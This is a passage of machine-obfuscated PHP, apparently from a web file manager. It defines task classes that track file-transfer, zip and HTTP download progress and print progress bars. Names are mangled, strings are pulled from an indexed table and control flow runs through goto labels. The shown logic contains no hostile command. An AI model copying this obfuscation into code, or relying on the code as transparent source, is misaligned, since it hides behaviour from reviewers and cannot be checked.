call_user_func_array(self::$callbacks[$ìíç¬Á÷], $¹şëÇÎï); if (self::$halts) { return; } } } } $ìíç¬Á÷++; } } if ($öí”© == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $„İ¨×–„ =& $_SERVER[ü¢ÙÊñÛ]; header($_SERVER[$„İ¨×–„[1701]] . $„İ¨×–„[1702]); echo $„İ¨×–„[1703]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Šç¨Ğ…Ÿ[1696]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto FÃµº§¤À‹; Eëƒ¬˜«: class TaskFileTransfer extends Task { protected function startAfter() { $µÉêÏ°Ş =& $_SERVER[ü¢ÙÊñÛ]; $ãšåÀÜ¶ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($µÉêÏ°Ş[1790], array($this, $µÉêÏ°Ş[1791])); Hook::bind($µÉêÏ°Ş[1297], array($this, $µÉêÏ°Ş[1792])); Hook::bind($µÉêÏ°Ş[1793], array($this, $µÉêÏ°Ş[1794])); Hook::bind($µÉêÏ°Ş[682], array($this, $µÉêÏ°Ş[1795])); Hook::bind($µÉêÏ°Ş[683], array($this, $µÉêÏ°Ş[1796])); Hook::bind($µÉêÏ°Ş[689], array($this, $µÉêÏ°Ş[1797])); Hook::bind($µÉêÏ°Ş[690], array($this, $µÉêÏ°Ş[1798])); Hook::bind($µÉêÏ°Ş[685], array($this, $µÉêÏ°Ş[1799])); Hook::bind($µÉêÏ°Ş[687], array($this, $µÉêÏ°Ş[1800])); Hook::bind($µÉêÏ°Ş[651], array($this, $µÉêÏ°Ş[1801])); Hook::bind($µÉêÏ°Ş[648], array($this, $µÉêÏ°Ş[1801])); Hook::bind($µÉêÏ°Ş[653], array($this, $µÉêÏ°Ş[1801])); Hook::bind($µÉêÏ°Ş[655], array($this, $µÉêÏ°Ş[1801])); Hook::bind($µÉêÏ°Ş[657], array($this, $µÉêÏ°Ş[1801])); Hook::bind($µÉêÏ°Ş[1802], array($this, $µÉêÏ°Ş[1803])); Hook::bind($µÉêÏ°Ş[673], array($this, $µÉêÏ°Ş[1804])); $this->sourceModelCopyFlag = !1; Hook::bind($µÉêÏ°Ş[1805], array($this, $µÉêÏ°Ş[1806])); Hook::bind($µÉêÏ°Ş[1807], array($this, $µÉêÏ°Ş[1808])); Hook::bind($µÉêÏ°Ş[1809], array($this, $µÉêÏ°Ş[1810])); $ãšåÀÜ¶[$µÉêÏ°Ş[1811]] = LNG($µÉêÏ°Ş[1812]); $ãšåÀÜ¶[$µÉêÏ°Ş[1813]] = 0; $ãšåÀÜ¶[$µÉêÏ°Ş[1814]] = 0; $ãšåÀÜ¶[$µÉêÏ°Ş[1131]] = $µÉêÏ°Ş[22]; $ãšåÀÜ¶[$µÉêÏ°Ş[1815]] = $µÉêÏ°Ş[22]; $ãšåÀÜ¶[$µÉêÏ°Ş[1816]] = 0; $ãšåÀÜ¶[$µÉêÏ°Ş[1817]] = 0; $ãšåÀÜ¶[$µÉêÏ°Ş[1818]] = 0; if (!$ãšåÀÜ¶[$µÉêÏ°Ş[1647]]) { $ãšåÀÜ¶[$µÉêÏ°Ş[1647]] = LNG($µÉêÏ°Ş[1819]); } } protected function endAfter() { $Ò¯‘Òª± =& $_SERVER[ü¢ÙÊñÛ]; Hook::unbind($Ò¯‘Òª±[1790], array($this, $Ò¯‘Òª±[1791])); Hook::unbind($Ò¯‘Òª±[1297], array($this, $Ò¯‘Òª±[1792])); Hook::unbind($Ò¯‘Òª±[1793], array($this, $Ò¯‘Òª±[1794])); Hook::unbind($Ò¯‘Òª±[682], array($this, $Ò¯‘Òª±[1795])); Hook::unbind($Ò¯‘Òª±[683], array($this, $Ò¯‘Òª±[1796])); Hook::unbind($Ò¯‘Òª±[689], array($this, $Ò¯‘Òª±[1797])); Hook::unbind($Ò¯‘Òª±[690], array($this, $Ò¯‘Òª±[1798])); Hook::unbind($Ò¯‘Òª±[685], array($this, $Ò¯‘Òª±[1799])); Hook::unbind($Ò¯‘Òª±[687], array($this, $Ò¯‘Òª±[1800])); Hook::unbind($Ò¯‘Òª±[651], array($this, $Ò¯‘Òª±[1801])); Hook::unbind($Ò¯‘Òª±[648], array($this, $Ò¯‘Òª±[1801])); Hook::unbind($Ò¯‘Òª±[653], array($this, $Ò¯‘Òª±[1801])); Hook::unbind($Ò¯‘Òª±[655], array($this, $Ò¯‘Òª±[1801])); Hook::unbind($Ò¯‘Òª±[657], array($this, $Ò¯‘Òª±[1801])); Hook::unbind($Ò¯‘Òª±[1802], array($this, $Ò¯‘Òª±[1803])); Hook::unbind($Ò¯‘Òª±[673], array($this, $Ò¯‘Òª±[1804])); Hook::unbind($Ò¯‘Òª±[1805], array($this, $Ò¯‘Òª±[1806])); Hook::unbind($Ò¯‘Òª±[1807], array($this, $Ò¯‘Òª±[1808])); Hook::unbind($Ò¯‘Òª±[1809], array($this, $Ò¯‘Òª±[1810])); } public function copyMoveStart($Ç°Å–, $°íê€›ï, $‹Äæ‘±Ì, $•¦‘áã¥) { $Ü±´šİÎ =& $_SERVER[ü¢ÙÊñÛ]; self::log($Ü±´šİÎ[1820] . $°íê€›ï . $Ü±´šİÎ[84] . $•¦‘áã¥); $“µ¿úğ“ = rtrim(TEMP_FILES, $Ü±´šİÎ[18]); if (substr($°íê€›ï, 0, strlen($“µ¿úğ“)) == $“µ¿úğ“) { return; } if (substr($•¦‘áã¥, 0, strlen($“µ¿úğ“)) == $“µ¿úğ“) { return; } $Ã®‹½Ò =& $this->task; $Ã®‹½Ò[$Ü±´šİÎ[1821]] = KodIO::transferType($Ç°Å–, $‹Äæ‘±Ì); $this->update(); } public function updateAfter() { $£êÜÓìù =& $_SERVER[ü¢ÙÊñÛ]; $ÂÄÁ°’ =& $this->task; if (!$ÂÄÁ°’[$£êÜÓìù[828]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ÂÄÁ°’[$£êÜÓìù[1821]] == $£êÜÓìù[1391]) { return; } self::updateTask($ÂÄÁ°’); } private static function updateTask(&$ĞŒ¹¾£) { $•–ëí·Ø =& $_SERVER[ü¢ÙÊñÛ]; if ($ĞŒ¹¾£[$•–ëí·Ø[1821]] == $•–ëí·Ø[1268] || $ĞŒ¹¾£[$•–ëí·Ø[1821]] == $•–ëí·Ø[121]) { if ($ĞŒ¹¾£[$•–ëí·Ø[1815]]) { $ĞŒ¹¾£[$•–ëí·Ø[1818]] = $ĞŒ¹¾£[$•–ëí·Ø[1817]] + $ĞŒ¹¾£[$•–ëí·Ø[1814]]; } } else { if ($ĞŒ¹¾£[$•–ëí·Ø[1821]] == $•–ëí·Ø[1392]) { if ($ĞŒ¹¾£[$•–ëí·Ø[1815]] == $•–ëí·Ø[1268]) { $ĞŒ¹¾£[$•–ëí·Ø[1818]] = $ĞŒ¹¾£[$•–ëí·Ø[1817]] + $ĞŒ¹¾£[$•–ëí·Ø[1814]] * 0.5; } else { if ($ĞŒ¹¾£[$•–ëí·Ø[1815]] == $•–ëí·Ø[121]) { $ĞŒ¹¾£[$•–ëí·Ø[1818]] = $ĞŒ¹¾£[$•–ëí·Ø[1817]] + $ĞŒ¹¾£[$•–ëí·Ø[1813]] * 0.5 + $ĞŒ¹¾£[$•–ëí·Ø[1814]] * 0.5; } } } } $ĞŒ¹¾£[$•–ëí·Ø[1761]] = $ĞŒ¹¾£[$•–ëí·Ø[1818]] / $ĞŒ¹¾£[$•–ëí·Ø[828]]; if ($ĞŒ¹¾£[$•–ëí·Ø[1761]] > 0) { $¼³éÁã› = timeFloat() - $ĞŒ¹¾£[$•–ëí·Ø[1763]] - $ĞŒ¹¾£[$•–ëí·Ø[1766]]; $ĞŒ¹¾£[$•–ëí·Ø[1767]] = $¼³éÁã› * (1 - $ĞŒ¹¾£[$•–ëí·Ø[1761]]) / $ĞŒ¹¾£[$•–ëí·Ø[1761]]; } } public function addPath($÷å¾¦ø) { $Ñ»€Ö×ø =& $_SERVER[ü¢ÙÊñÛ]; if (!$÷å¾¦ø) { return; } $«ÆÄİ¾­ =& $this->task; $ø¬€ÔÛõ = IO::infoWithChildren($÷å¾¦ø); $Ù¼½ô¸Ú = $«ÆÄİ¾­[$Ñ»€Ö×ø[1822]] ? $«ÆÄİ¾­[$Ñ»€Ö×ø[1822]][$Ñ»€Ö×ø[1823]] : 0; $«ÆÄİ¾­[$Ñ»€Ö×ø[1822]] = array($Ñ»€Ö×ø[1823] => $Ù¼½ô¸Ú + 1, $Ñ»€Ö×ø[505] => $ø¬€ÔÛõ[$Ñ»€Ö×ø[42]], $Ñ»€Ö×ø[98] => $ø¬€ÔÛõ[$Ñ»€Ö×ø[98]], $Ñ»€Ö×ø[593] => $ø¬€ÔÛõ[$Ñ»€Ö×ø[593]] ? $ø¬€ÔÛõ[$Ñ»€Ö×ø[593]] : $ø¬€ÔÛõ[$Ñ»€Ö×ø[98]]); if ($ø¬€ÔÛõ[$Ñ»€Ö×ø[43]] == $Ñ»€Ö×ø[243]) { $«ÆÄİ¾­[$Ñ»€Ö×ø[1129]] += 1; } else { $«ÆÄİ¾­[$Ñ»€Ö×ø[1129]] += $ø¬€ÔÛõ[$Ñ»€Ö×ø[93]][$Ñ»€Ö×ø[91]]; if ($ø¬€ÔÛõ[$Ñ»€Ö×ø[204]]) { $«ÆÄİ¾­[$Ñ»€Ö×ø[1129]] += $ø¬€ÔÛõ[$Ñ»€Ö×ø[93]][$Ñ»€Ö×ø[92]] + 1; } } $«ÆÄİ¾­[$Ñ»€Ö×ø[828]] += $ø¬€ÔÛõ[$Ñ»€Ö×ø[90]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($µùÖ¸ÌÉ) { } public function sourceAddHashEnd($Ø…úá˜) { } public function sourceAddFileStart($ìàŸ¤è) { $¹“¥ÛÜş =& $_SERVER[ü¢ÙÊñÛ]; $“‡İºš =& $this->task; $“‡İºš[$¹“¥ÛÜş[1813]] = $ìàŸ¤è[$¹“¥ÛÜş[90]]; $“‡İºš[$¹“¥ÛÜş[1811]] = $ìàŸ¤è[$¹“¥ÛÜş[42]]; $“‡İºš[$¹“¥ÛÜş[1131]] = $ìàŸ¤è[$¹“¥ÛÜş[42]]; $“‡İºš[$¹“¥ÛÜş[1824]] = $ìàŸ¤è[$¹“¥ÛÜş[98]]; $this->update(); } public function sourceAddFileEnd($ŞßÎ‰ô) { $Ş÷¤™Áø =& $_SERVER[ü¢ÙÊñÛ]; $šáØ”ğİ =& $this->task; $šáØ”ğİ[$Ş÷¤™Áø[1818]] += $ŞßÎ‰ô[$Ş÷¤™Áø[90]]; $šáØ”ğİ[$Ş÷¤™Áø[1824]] = $ŞßÎ‰ô[$Ş÷¤™Áø[98]]; $this->update(1); } public function copyFileStart($€„èúò‹, $…œÓî¦Ñ, $Æ¦²Îà, $¹¬½ú¯É, $Û“ğ³áú, $ôÕÉù¦û) { $š¦õôä =& $_SERVER[ü¢ÙÊñÛ]; $š¶Œ¥®± = $Û“ğ³áú; if ($š¶Œ¥®± == $GLOBALS[$š¦õôä[1825]]) { $š¶Œ¥®± = $GLOBALS[$š¦õôä[1826]]; } $GLOBALS[$š¦õôä[1826]] = $Û“ğ³áú; $GLOBALS[$š¦õôä[1825]] = $ôÕÉù¦û; $ÖóÒ’ç‘ =& $this->task; $ÖóÒ’ç‘[$š¦õôä[1811]] = $š¶Œ¥®±; $ÖóÒ’ç‘[$š¦õôä[1813]] = (int) $€„èúò‹->size($…œÓî¦Ñ); $ÖóÒ’ç‘[$š¦õôä[1814]] = 0; $ÖóÒ’ç‘[$š¦õôä[1131]] = $š¦õôä[22]; $ÖóÒ’ç‘[$š¦õôä[1815]] = $š¦õôä[22]; $ÖóÒ’ç‘[$š¦õôä[1816]] = 0; $õŞ©åµˆ = $ÖóÒ’ç‘[$š¦õôä[1813]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ÖóÒ’ç‘[$š¦õôä[486]] . $š¦õôä[1827]); if ($õŞ©åµˆ && file_exists(get_path_father($¹¬½ú¯É))) { Cache::set($ÖóÒ’ç‘[$š¦õôä[486]] . $š¦õôä[1827], $¹¬½ú¯É); $ÖóÒ’ç‘[$š¦õôä[1784]] = array($š¦õôä[1828], $š¦õôä[1829]); } $this->update(0, $õŞ©åµˆ); } public static function updateCopyLocalFileSize($Àú§µÓş) { $Ò’Áıİ½ =& $_SERVER[ü¢ÙÊñÛ]; $™¨Í—„¶ = Cache::get($Àú§µÓş[$Ò’Áıİ½[486]] . $Ò’Áıİ½[1827]); if (!$™¨Í—„¶ || !file_exists($™¨Í—„¶)) { return $Àú§µÓş; } $Àú§µÓş[$Ò’Áıİ½[1814]] = @filesize($™¨Í—„¶); $Àú§µÓş[$Ò’Áıİ½[1818]] += $Àú§µÓş[$Ò’Áıİ½[1814]]; self::updateTask($Àú§µÓş); return $Àú§µÓş; } public function copyFileEnd($üê˜€‰ë, $æ¦ Îı·, $ËìˆÒæÑ, $Öá•…ë¾, $ĞíÃûñà, $Í¦ÎÔï­) { $¡ã—Íë =& $_SERVER[ü¢ÙÊñÛ]; $õ²¼üíµ =& $this->task; $õ²¼üíµ[$¡ã—Íë[1814]] = $õ²¼üíµ[$¡ã—Íë[1813]]; $õ²¼üíµ[$¡ã—Íë[1815]] = $¡ã—Íë[22]; unset($õ²¼üíµ[$¡ã—Íë[1784]]); if ($ĞíÃûñà == $õ²¼üíµ[$¡ã—Íë[1811]]) { $õ²¼üíµ[$¡ã—Íë[1817]] += $õ²¼üíµ[$¡ã—Íë[1813]]; $õ²¼üíµ[$¡ã—Íë[1818]] = $õ²¼üíµ[$¡ã—Íë[1817]]; $Ôéá§¥ = 1; if (isset($õ²¼üíµ[$¡ã—Íë[1824]]) && $õ²¼üíµ[$¡ã—Íë[1824]] == $æ¦ Îı·) { $Ôéá§¥ = 0; } $this->update($Ôéá§¥); } else { $this->update(); $õ²¼üíµ[$¡ã—Íë[1814]] = 0; } Cache::remove($õ²¼üíµ[$¡ã—Íë[486]] . $¡ã—Íë[1827]); self::log($¡ã—Íë[1830] . $æ¦ Îı· . $¡ã—Íë[84] . $Öá•…ë¾ . $¡ã—Íë[10] . $ĞíÃûñà . $¡ã—Íë[1831] . $õ²¼üíµ[$¡ã—Íë[1811]]); } public function updateFileEnd($İúæĞ, $ú±†–ûö) { $–§¨›•ª =& $_SERVER[ü¢ÙÊñÛ]; $ï¨†› =& $this->task; $ï¨†›[$–§¨›•ª[1811]] = $İúæĞ; $ï¨†›[$–§¨›•ª[1813]] = $ú±†–ûö; $ï¨†›[$–§¨›•ª[1817]] += $ú±†–ûö; $ï¨†›[$–§¨›•ª[1818]] = $ï¨†›[$–§¨›•ª[1817]]; $this->update(1); self::log($–§¨›•ª[1832] . $İúæĞ); } public function sourceModelCopy($äÈ¼É) { $£Ø¹ãØó =& $_SERVER[ü¢ÙÊñÛ]; $ğÃ©›š = $äÈ¼É[0]; $ƒ§ÃÊğÇ = $äÈ¼É[1]; $Úß¥íˆ‰ =& $this->task; $this->sourceModelCopyFlag = !0; $°ŠåÒ¥º = 0; switch ($ğÃ©›š) { case $£Ø¹ãØó[649]: $°ŠåÒ¥º = 1; break; case $£Ø¹ãØó[652]: $Úß¥íˆ‰[$£Ø¹ãØó[1811]] = $ƒ§ÃÊğÇ[$£Ø¹ãØó[42]]; break; case $£Ø¹ãØó[654]: $°ŠåÒ¥º = intval($äÈ¼É[$£Ø¹ãØó[467]] * 0.4); break; case $£Ø¹ãØó[656]: $°ŠåÒ¥º = intval($äÈ¼É[$£Ø¹ãØó[467]] * 0.2); break; case $£Ø¹ãØó[658]: $°ŠåÒ¥º = intval($äÈ¼É[$£Ø¹ãØó[467]] * 0.4); break; } $this->update($°ŠåÒ¥º); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Ñë…, $ÕÚÔùÁ–) { $¨è¤áöş =& $_SERVER[ü¢ÙÊñÛ]; $this->sourceModelCopyFlag = !0; $³‹ÉŞ›ø = 1; if (isset($Ñë…[$¨è¤áöş[93]])) { $³‹ÉŞ›ø = $Ñë…[$¨è¤áöş[93]][$¨è¤áöş[91]]; $³‹ÉŞ›ø = $³‹ÉŞ›ø + $Ñë…[$¨è¤áöş[93]][$¨è¤áöş[92]] + 1; } $this->update($³‹ÉŞ›ø); $this->sourceModelCopyFlag = !1; } public function sourceMove($ì‹ğé‰Ò) { $this->sourceRemove($ì‹ğé‰Ò, !1); } public function curlProgress($ëë¢—Á™, $¬Å†Ùş•, $Ğ¶‡»ñÕ, $øëİÊéÂ, $ˆ˜…Ä‚) { $»ÓÅ‰…œ =& $_SERVER[ü¢ÙÊñÛ]; $åå‘£æÍ =& $this->task; if ($ˆ˜…Ä‚ > 0) { $åå‘£æÍ[$»ÓÅ‰…œ[1131]] = $»ÓÅ‰…œ[1833]; $åå‘£æÍ[$»ÓÅ‰…œ[1815]] = $»ÓÅ‰…œ[121]; if ($åå‘£æÍ[$»ÓÅ‰…œ[1813]]) { $åå‘£æÍ[$»ÓÅ‰…œ[1814]] = $ˆ˜…Ä‚; } if ($åå‘£æÍ[$»ÓÅ‰…œ[1816]]) { $åå‘£æÍ[$»ÓÅ‰…œ[1814]] = $ˆ˜…Ä‚ + $åå‘£æÍ[$»ÓÅ‰…œ[1816]]; } } else { if ($Ğ¶‡»ñÕ > 0) { if ($åå‘£æÍ[$»ÓÅ‰…œ[1813]] == $¬Å†Ùş•) { $åå‘£æÍ[$»ÓÅ‰…œ[1814]] = $Ğ¶‡»ñÕ; $åå‘£æÍ[$»ÓÅ‰…œ[1131]] = $»ÓÅ‰…œ[1834]; $åå‘£æÍ[$»ÓÅ‰…œ[1815]] = $»ÓÅ‰…œ[1268]; } } } $this->update(); } public function curlProgressStart($íÒÜ°ü) { } public function curlProgressEnd($ğ¢˜ö«Ö) { $‚É’µœ´ =& $_SERVER[ü¢ÙÊñÛ]; $èú‰Ş­Ğ =& $this->task; $šãÓÄ¦ = curl_getinfo($ğ¢˜ö«Ö); $µÈÆÄ´’ = $šãÓÄ¦[$‚É’µœ´[1835]]; if ($µÈÆÄ´’ == -1) { $µÈÆÄ´’ = $šãÓÄ¦[$‚É’µœ´[1836]]; } if ($èú‰Ş­Ğ[$‚É’µœ´[1815]] == $‚É’µœ´[121] && $µÈÆÄ´’) { $èú‰Ş­Ğ[$‚É’µœ´[1816]] += $µÈÆÄ´’; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $‹áˆÀ¢ =& $_SERVER[ü¢ÙÊñÛ]; $òÃÏ¥ôü =& $this->task; $òÃÏ¥ôü[$‹áˆÀ¢[1837]] = 1; Hook::bind($‹áˆÀ¢[1805], array($this, $‹áˆÀ¢[1838])); Hook::bind($‹áˆÀ¢[1807], array($this, $‹áˆÀ¢[1839])); Hook::bind($‹áˆÀ¢[1809], array($this, $‹áˆÀ¢[1840])); } protected function endAfter() { $´Ü™‘÷ =& $_SERVER[ü¢ÙÊñÛ]; Hook::unbind($´Ü™‘÷[1805], array($this, $´Ü™‘÷[1838])); Hook::unbind($´Ü™‘÷[1807], array($this, $´Ü™‘÷[1839])); Hook::unbind($´Ü™‘÷[1809], array($this, $´Ü™‘÷[1840])); } public function progressStart($¾Øå‡Œ) { $ùşú¾Ê¡ =& $_SERVER[ü¢ÙÊñÛ]; $“¬â×Š• = curl_getinfo($¾Øå‡Œ); self::log($ùşú¾Ê¡[1841] . $“¬â×Š•[$ùşú¾Ê¡[394]]); self::valueSet($this->task[$ùşú¾Ê¡[486]], $this->task); } public function progressEnd($×Ïıƒîœ) { $ò£œ½Øì =& $_SERVER[ü¢ÙÊñÛ]; self::log($ò£œ½Øì[1842] . $this->task[$ò£œ½Øì[486]]); $this->end(); } public function progress($ÜËÖƒáÎ, $Àûœù¹ı, $ã¼Ÿä£—, $©¹Ëó¥, $Îèæãß‚) { $ÅÃğòĞÀ =& $_SERVER[ü¢ÙÊñÛ]; $æß€ëÒ =& $this->task; if ($Îèæãß‚ > 0) { $æß€ëÒ[$ÅÃğòĞÀ[1129]] = $æß€ëÒ[$ÅÃğòĞÀ[1129]] == 0 ? $©¹Ëó¥ : $æß€ëÒ[$ÅÃğòĞÀ[1129]]; $æß€ëÒ[$ÅÃğòĞÀ[1760]] = $Îèæãß‚; } else { if ($ã¼Ÿä£— > 0) { $æß€ëÒ[$ÅÃğòĞÀ[1129]] = $æß€ëÒ[$ÅÃğòĞÀ[1129]] == 0 ? $Àûœù¹ı : $æß€ëÒ[$ÅÃğòĞÀ[1129]]; $æß€ëÒ[$ÅÃğòĞÀ[1760]] = $ã¼Ÿä£—; } } $this->update(); self::log("\160\162\157\147\x72\x65\x73\163\110\x74\x74\160\72\x64\157\x77\x6e\x3a{$ã¼Ÿä£—}\57{$Àûœù¹ı}\73\40\165\x70\x6c\157\x61\144\x3a{$Îèæãß‚}\x2f{$©¹Ëó¥}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÎêŞ“‚ß, $“òæâ‘ˆ = '', $Ã­µ¯ÕÒ = 0, $œ³Ğ¬¡à = '') { $Û¯¶ğ±Æ =& $_SERVER[ü¢ÙÊñÛ]; $œ³Ğ¬¡à = $œ³Ğ¬¡à ? $œ³Ğ¬¡à : ($“òæâ‘ˆ ? $“òæâ‘ˆ : $ÎêŞ“‚ß); $–”„î¬ = new Task($ÎêŞ“‚ß, $“òæâ‘ˆ, $Ã­µ¯ÕÒ, $œ³Ğ¬¡à); $GLOBALS[$Û¯¶ğ±Æ[1843] . $ÎêŞ“‚ß] = new TaskLog($Û¯¶ğ±Æ[1742], $–”„î¬, $œ³Ğ¬¡à); return $–”„î¬; } public function __construct($€ö‚™†Æ = '', $˜Í²¡³¶ = '', $­ËØüñé = '') { $âºÃ¦µ =& $_SERVER[ü¢ÙÊñÛ]; if (!$€ö‚™†Æ) { $€ö‚™†Æ = $âºÃ¦µ[1742]; } $ğÙêÓ“™ = $€ö‚™†Æ . $âºÃ¦µ[473] . rand_string(10); if (!$­ËØüñé) { $­ËØüñé = $€ö‚™†Æ . $âºÃ¦µ[63] . $­ËØüñé; } switch ($€ö‚™†Æ) { case $âºÃ¦µ[1742]: if (!$˜Í²¡³¶ || !$˜Í²¡³¶->task) { return echoLog($€ö‚™†Æ . $âºÃ¦µ[1844]); } $Œ¯™¦ÆÓ = $˜Í²¡³¶; $ğÙêÓ“™ = $Œ¯™¦ÆÓ->task[$âºÃ¦µ[486]]; $€ö‚™†Æ = $Œ¯™¦ÆÓ->task[$âºÃ¦µ[486]]; if (!$Œ¯™¦ÆÓ->task[$âºÃ¦µ[1647]]) { $Œ¯™¦ÆÓ->task[$âºÃ¦µ[1647]] = $­ËØüñé ? $­ËØüñé : $€ö‚™†Æ; } break; case $âºÃ¦µ[1845]: if (!$˜Í²¡³¶) { return echoLog($€ö‚™†Æ . $âºÃ¦µ[1846]); } $İşã×£ = is_string($˜Í²¡³¶) ? array($˜Í²¡³¶) : $˜Í²¡³¶; $Œ¯™¦ÆÓ = new TaskFileTransfer($ğÙêÓ“™, $€ö‚™†Æ, 0, $­ËØüñé ? $­ËØüñé : $İşã×£[0]); foreach ($İşã×£ as $î«µĞ¥) { $Œ¯™¦ÆÓ->addPath($î«µĞ¥); } break; case $âºÃ¦µ[400]: if (!$˜Í²¡³¶) { return echoLog($€ö‚™†Æ . $âºÃ¦µ[1846]); } $İşã×£ = is_string($˜Í²¡³¶) ? array($˜Í²¡³¶) : $˜Í²¡³¶; $Œ¯™¦ÆÓ = new TaskZip($ğÙêÓ“™, $€ö‚™†Æ, 0, $­ËØüñé ? $­ËØüñé : $İşã×£[0]); foreach ($İşã×£ as $î«µĞ¥) { $Œ¯™¦ÆÓ->addPath($î«µĞ¥); } break; case $âºÃ¦µ[1288]: if (!$˜Í²¡³¶) { return echoLog($€ö‚™†Æ . $âºÃ¦µ[1846]); } $Œ¯™¦ÆÓ = new TaskUnZip($ğÙêÓ“™, $€ö‚™†Æ, 0, $­ËØüñé ? $­ËØüñé : $˜Í²¡³¶); if ($˜Í²¡³¶) { $Œ¯™¦ÆÓ->addFile($˜Í²¡³¶); } break; case $âºÃ¦µ[163]: $Œ¯™¦ÆÓ = new TaskHttp($ğÙêÓ“™, $€ö‚™†Æ); break; default: return; break; } $this->task = $Œ¯™¦ÆÓ; $this->taskID = $ğÙêÓ“™; Hook::bind($âºÃ¦µ[1780], array($this, $âºÃ¦µ[1847])); Hook::bind($âºÃ¦µ[1782], array($this, $âºÃ¦µ[1848])); Hook::bind($âºÃ¦µ[1776], array($this, $âºÃ¦µ[1849])); echoLog($âºÃ¦µ[1850] . $Œ¯™¦ÆÓ->task[$âºÃ¦µ[1647]]); } public function __destruct() { $this->end(); } public function end($¥±»ÏØÈ = '') { $¸‰·ÊèÀ =& $_SERVER[ü¢ÙÊñÛ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¥±»ÏØÈ); $this->task = !1; $this->taskID = !1; Hook::unbind($¸‰·ÊèÀ[1780], array($this, $¸‰·ÊèÀ[1847])); Hook::unbind($¸‰·ÊèÀ[1782], array($this, $¸‰·ÊèÀ[1848])); Hook::unbind($¸‰·ÊèÀ[1776], array($this, $¸‰·ÊèÀ[1849])); } public function taskUpdate($Ú’ç„Æ¥) { $¢ŠÁŞıø =& $_SERVER[ü¢ÙÊñÛ]; if (!$Ú’ç„Æ¥ || $this->taskID != $Ú’ç„Æ¥[$¢ŠÁŞıø[486]]) { return; } $òİ­Ôòµ = 20; $åİË ó· = intval($Ú’ç„Æ¥[$¢ŠÁŞıø[1761]] * $òİ­Ôòµ); $¨ñø•‘ = $¢ŠÁŞıø[187] . str_repeat($¢ŠÁŞıø[517], $åİË ó·) . $¢ŠÁŞıø[1080] . str_repeat($¢ŠÁŞıø[63], $òİ­Ôòµ - $åİË ó·) . $¢ŠÁŞıø[189]; $Êªö…äú = $¨ñø•‘ . sprintf($¢ŠÁŞıø[1851], $Ú’ç„Æ¥[$¢ŠÁŞıø[1761]] * 100) . $¢ŠÁŞıø[1852]; $•§²”¹» = $Êªö…äú . $Ú’ç„Æ¥[$¢ŠÁŞıø[1760]] . $¢ŠÁŞıø[18] . $Ú’ç„Æ¥[$¢ŠÁŞıø[1129]] . LNG($¢ŠÁŞıø[1853]); $çÀ‰û€è = $¢ŠÁŞıø[22]; if ($Ú’ç„Æ¥[$¢ŠÁŞıø[1837]]) { $•§²”¹» = $Êªö…äú . size_format($Ú’ç„Æ¥[$¢ŠÁŞıø[1760]]) . $¢ŠÁŞıø[18] . size_format($Ú’ç„Æ¥[$¢ŠÁŞıø[1129]]); $çÀ‰û€è = size_format($Ú’ç„Æ¥[$¢ŠÁŞıø[1762]]) . $¢ŠÁŞıø[1854]; } if ($Ú’ç„Æ¥[$¢ŠÁŞıø[1131]]) { $Ú’ç„Æ¥[$¢ŠÁŞıø[1811]] = $Ú’ç„Æ¥[$¢ŠÁŞıø[1131]] . $¢ŠÁŞıø[63] . $Ú’ç„Æ¥[$¢ŠÁŞıø[1811]]; } if ($Ú’ç„Æ¥[$¢ŠÁŞıø[1811]]) { $œ¨ú„Í = $¢ŠÁŞıø[22]; if ($Ú’ç„Æ¥[$¢ŠÁŞıø[1813]]) { $œ¨ú„Í = $¢ŠÁŞıø[60] . size_format($Ú’ç„Æ¥[$¢ŠÁŞıø[1814]]) . $¢ŠÁŞıø[18] . size_format($Ú’ç„Æ¥[$¢ŠÁŞıø[1813]]); } $çÀ‰û€è .= $Ú’ç„Æ¥[$¢ŠÁŞıø[1811]] . $œ¨ú„Í; } if ($Ú’ç„Æ¥[$¢ŠÁŞıø[828]] && !$Ú’ç„Æ¥[$¢ŠÁŞıø[1813]]) { $çÀ‰û€è .= $¢ŠÁŞıø[63] . size_format($Ú’ç„Æ¥[$¢ŠÁŞıø[1818]]) . $¢ŠÁŞıø[18] . size_format($Ú’ç„Æ¥[$¢ŠÁŞıø[828]]); } echoLog($•§²”¹» . $¢ŠÁŞıø[63] . $çÀ‰û€è, !0); } public function taskEnd($ˆßúÜ ¾) { $ÄƒïÆÙú =& $_SERVER[ü¢ÙÊñÛ]; if (!$ˆßúÜ ¾ || $this->taskID != $ˆßúÜ ¾[$ÄƒïÆÙú[486]]) { return; } $ş¡Îè… = $ˆßúÜ ¾ ? $ˆßúÜ ¾[$ÄƒïÆÙú[1760]] . $ÄƒïÆÙú[18] . $ˆßúÜ ¾[$ÄƒïÆÙú[1129]] . LNG($ÄƒïÆÙú[1853]) . $ÄƒïÆÙú[85] : $ÄƒïÆÙú[22]; echoLog($ÄƒïÆÙú[1855] . $ˆßúÜ ¾[$ÄƒïÆÙú[1647]] . ($ˆßúÜ ¾[$ÄƒïÆÙú[537]] ? $ÄƒïÆÙú[85] . $ˆßúÜ ¾[$ÄƒïÆÙú[537]] : $ÄƒïÆÙú[22]) . $ÄƒïÆÙú[85] . $ş¡Îè… . $ÄƒïÆÙú[1856] . sprintf($ÄƒïÆÙú[918], timeFloat() - $ˆßúÜ ¾[$ÄƒïÆÙú[1763]]) . $ÄƒïÆÙú[1775]); $this->end(); } public function taskKill($¡ÅÎ¼™–) { $è»½Ò‘ä =& $_SERVER[ü¢ÙÊñÛ]; if (!$¡ÅÎ¼™– || $this->taskID != $¡ÅÎ¼™–[$è»½Ò‘ä[486]]) { return; } echoLog($è»½Ò‘ä[1857] . $¡ÅÎ¼™–[$è»½Ò‘ä[1647]]); } } goto E¢Â·ÏÚ; Dœ‚¦¼ï¸ğ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($˜«³êı€ = '') { 